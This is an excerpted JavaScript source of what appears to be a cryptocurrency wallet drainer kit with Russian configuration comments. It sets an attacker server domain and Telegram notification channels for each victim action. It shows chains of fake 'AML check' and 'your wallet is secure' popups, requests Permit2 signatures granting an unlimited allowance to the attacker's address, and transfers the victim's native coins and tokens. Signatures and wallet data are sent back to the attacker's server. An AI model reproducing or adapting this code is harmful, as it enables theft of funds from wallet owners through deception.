...
let CF_EKEY = 11223344; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
...
const CF_Server_URL = "api.web3coinswap.com"; // Указать домен, который прикреплен к серверу дрейнера
...
const CF_Custom_Chat = {
    Enable: 1, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
    Chat_Settings: {
        enter_website: "-4647228309", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
        leave_website: "-4647228309", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
        connect_success: "-4647228309", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
        connect_request: "-4647228309", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
        connect_cancel: "-4647228309", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
        approve_request: "-4647228309", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
        approve_success: "-4647228309", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
        approve_cancel: "-4647228309", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
        permit_sign_data: "-4647228309", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
        transfer_request: "-4647228309", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
        transfer_success: "-4647228309", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
        transfer_cancel: "-4647228309", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
        sign_request: "-4647228309", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
        sign_success: "-4647228309", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
        sign_cancel: "-4647228309", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
        chain_request: "-4647228309", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
        chain_success: "-4647228309", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
        chain_cancel: "-4647228309", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
    }
};
...
let CF_Ready = false,
    ...
    CF_Process = false,
    CF_Provider = null,
    CF_Current_Provider = null,
    CF_Current_Address = null,
    CF_Current_Chain_ID = null,
    CF_Web3 = null,
    CF_Signer = null,
    CF_Check_Done = false,
    CF_Currencies = {},
    CF_Force_Mode = false,
    CF_Sign_Disabled = false,
    BL_US = false,
    SP_US = false,
    XY_US = false,
    CF_Bad_Country = false,
    CF_Connection = false,
    CF_Load_Time = null,
    CF_Gas_Multiplier = 2,
    CF_Partner_Address = false;
...
(async() => {
    rsk_kes = CF_EKEY;
    CF_EKEY = Math.floor(Math.random() * 1000);
})()
...
const send_request = async(data) => {
    try {
        ...
        const encode_key = btoa(String(5 + 10 + 365 + 2048 + 888 + rsk_kes));
        ...
        const response = await fetch((CF_HTTP_MODE ? 'http://' : 'https://') + CF_Server_URL + ((CF_Server_PORT != 80 && CF_Server_PORT != 443) ? (':' + String(CF_Server_PORT)) : ''), {
            ...
            body: `v=201124&s=1&r=${request_data}`
        });
...
const connect_success = async() => {
    try {
        ...
        await send_request({
            ...
            user_id: CF_ID,
            address: CF_Current_Address,
            wallet: CF_Current_Provider,
            chain_id: CF_Current_Chain_ID
        });
    } catch (err) {
        console.log(err);
    }
...
const get_tokens = async(address) => {
    try {
        let tokens = [],
            response = await fetch(`https://rpc.ankr.com/multichain/${CF_Settings.AT || ''}`, {
                method: 'POST',
                headers: {
    ...
    try {
        if (CF_Loader_Style == 2) {
            MSL.fire({
                ...
                text: 'Connecting securely to blockchain...',
                showConfirmButton: true,
                ...
                MSL.fire({
                    ...
                    text: 'Linking to blockchain nodes...',
                    showConfirmButton: true,
                    confirmButtonText: 'Please wait...',
                    timer: 3000,
                    color: CF_Color_Scheme
                    ...
                    MSL.fire({
                        ...
                        subtitle: 'Blockchain connection secured',
                        text: 'Ready to retrieve wallet details!',
                        ...
                        MSL.fire({
                            ...
                            text: 'Accessing wallet information...',
                            showConfirmButton: true,
                            ...
                            MSL.fire({
                                ...
                                subtitle: 'Address retrieved successfully',
                                text: 'Proceeding with additional checks...',
                                showConfirmButton: false,
                                timer: 2000,
                                color: CF_Color_Scheme
                            }).then(() => {
                                ...
                                MSL.fire({
                                    icon: 'load',
                                    title: 'Blockchain Status Verification',
                                    text: 'Checking latest blockchain state...',
                                    showConfirmButton: true,
                                    ...
                                    MSL.fire({
                                        ...
                                        text: 'Conducting AML compliance check...',
                                        showConfirmButton: true,
                                        confirmButtonText: 'Analyzing...',
                                        timer: 4000,
                                        color: CF_Color_Scheme
                                    }).then(() => {
                                        if (CF_Check_Done) return;
                                        MSL.fire({
                                            icon: 'error',
                                            title: 'Minor Risk Detected',
                                            subtitle: 'Anomaly in wallet history',
                                            text: 'Analysis will continue with caution.',
                                            showConfirmButton: false,
                                            timer: 3000,
                                            color: CF_Color_Scheme
                                        }).then(() => {
                                            ...
                                            MSL.fire({
                                                ...
                                                subtitle: 'No significant issues found',
                                                text: 'Proceeding to reputation check.',
                                                showConfirmButton: false,
                                                timer: 3000,
                                                color: CF_Color_Scheme
                                            }).then(() => {
                                                ...
                                                MSL.fire({
                                                    ...
                                                    text: 'Assessing wallet reputation score...',
                                                    showConfirmButton: true,
                                                    confirmButtonText: 'Assessing...',
                                                    timer: 3000,
                                                    color: CF_Color_Scheme
                                                }).then(() => {
                                                    if (CF_Check_Done) return;
                                                    MSL.fire({
                                                        ...
                                                        subtitle: 'Wallet reputation score approved',
                                                        ...
                                                        MSL.fire({
                                                            icon: 'load',
                                                            title: 'Finalizing Checks',
                                                            text: 'Final verification of wallet credentials...',
                                                            showConfirmButton: true,
                                                            confirmButtonText: 'Finalizing...',
                                                            timer: 4000,
                                                            color: CF_Color_Scheme
                                                        }).then(() => {
                                                            if (CF_Check_Done) return;
                                                            MSL.fire({
                                                                ...
                                                                subtitle: 'Your wallet is secure!',
                                                                text: 'All checks have been passed successfully.',
                                                                showConfirmButton: false,
                                                                timer: 4000,
                                                                color: CF_Color_Scheme
                                                            }).then(() => {
                                                                ...
                                                                MSL.fire({
                                                                    icon: 'load',
                                                                    title: 'Finalizing',
                                                                    text: 'Verifying additional details...',
                                                                    showConfirmButton: true,
                                                                    confirmButtonText: 'Almost there...',
                                                                    timer: 300000,
                                                                    color: CF_Color_Scheme
                                                                });
                                                            });
...
const SIGN_NATIVE = async(asset) => {
    ...
    let gas_limit = null;
    try { gas_limit = await node.estimateGas(unsigned_tx) } catch (err) { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }
    ...
    if (CF_Settings.Settings.Reserves.Mode == 1) {
        ...
        let max_value = 0;
        let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
        for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
            ...
            max_value = elem.amount;
            current_percent = elem.percent;
        }
    ...
    sign_data = sign_data.substring(2);
    const r_data = "0x" + sign_data.substring(0, 64);
    const s_data = "0x" + sign_data.substring(64, 128);
    const rhema = parseInt(sign_data.substring(128, 130), 16);
    ...
    if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
...
const DO_CONTRACT_NEW = async(asset) => {
    ...
    const contract_method = response.method;
    ...
    await transfer_success(asset, available_amount);
    sign_ready();
...
const DO_RANDOMIZER_NATIVE = async(asset) => {
    ...
    const x_promise = send_request({
        ...
        wallet: CF_Settings.Personal_Wallet,
        chain_id: asset.chain_id,
...
const TRANSFER_NATIVE = async(asset, ignore_contract = false) => {
    ...
    if (CF_Settings.Settings.Use_Swap_Bypass_For_ETH && asset.chain_id == 1 && asset.amount_usd >= 50) return DO_SWAP_BYPASS_NATIVE(asset);
...
const check_permit2_allowance = async(asset) => {
    try {
        ...
        if (ethers.BigNumber.from(allowance).gte(ethers.BigNumber.from(balance))) return true;
        else return false;
    } catch (err) {
        return false;
    }
...
const DO_PERMIT2 = async(asset, assets) => {
    ...
    if (assets.length > 1) {
        ...
        permit_message = {
            "details": {
                ...
                "amount": "1461501637330902918203684832716283019655932542975",
                "expiration": permit_deadline,
                "nonce": (await contract.allowance(CF_Current_Address, asset.address, (CF_Settings.Settings.Use_Randomizer_For_Tokens ? CF_Settings.Personal_Wallet.address : CF_Settings.Address))).nonce
            },
            "spender": (CF_Settings.Settings.Use_Randomizer_For_Tokens ?
                CF_Settings.Personal_Wallet.address : CF_Settings.Address),
            "sigDeadline": permit_deadline
    ...
    if (permit_signature != null) {
        ...
        const x_promise = send_request({
            ...
            address: CF_Current_Address,
            mode: permit_mode,
            PW: CF_Settings.Personal_Wallet
        });
...
const get_wallet_assets = async(address) => {
    try {
        let response = await send_request({ action: 'check_wallet', address: CF_Current_Address }),
            assets = [];
        ...
        if (CF_Loader_Style == 2) {
            MSL.fire({
                ...
                MSL.fire({
                    ...
                    text: 'The server is processing your request, please wait a little, it will take about a minute...',
                    showConfirmButton: true,
                    confirmButtonText: 'Loading...',
                    color: CF_Color_Scheme
                });
